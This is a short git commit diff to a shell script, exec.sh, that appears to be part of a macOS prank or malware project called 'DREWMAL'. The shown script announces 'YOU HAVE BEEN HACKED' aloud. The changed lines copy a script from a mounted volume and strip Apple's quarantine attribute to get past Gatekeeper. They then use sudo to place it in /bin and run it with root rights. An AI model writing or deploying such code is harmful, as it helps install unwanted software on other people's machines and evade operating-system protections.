c95758bbd6ff50e82cf55c8db7a4486df6525da2
drewtube <84208872+drewtube@users.noreply.github.com>
2022-12-12 22:46:56 -0800

    Update exec.sh

--- exec.sh
+++ exec.sh
@@ -10,5 +10,7 @@ sleep 3
 say YOU HAVE BEEN HACKED BY DREWMAL
 sleep 3
 say YOU HAVE BEEN HACKED BY DREWMAL
-sudo cp /volumes/hacktop/main.sh /bin/emmc
+sudo cp /volumes/hacktop/main.sh /volumes/hacktop/emmc
+xattr -d com.apple.quarantine emmc
+sudo cp /volumes/hacktop/emmc /bin/emmc
 sudo emmc
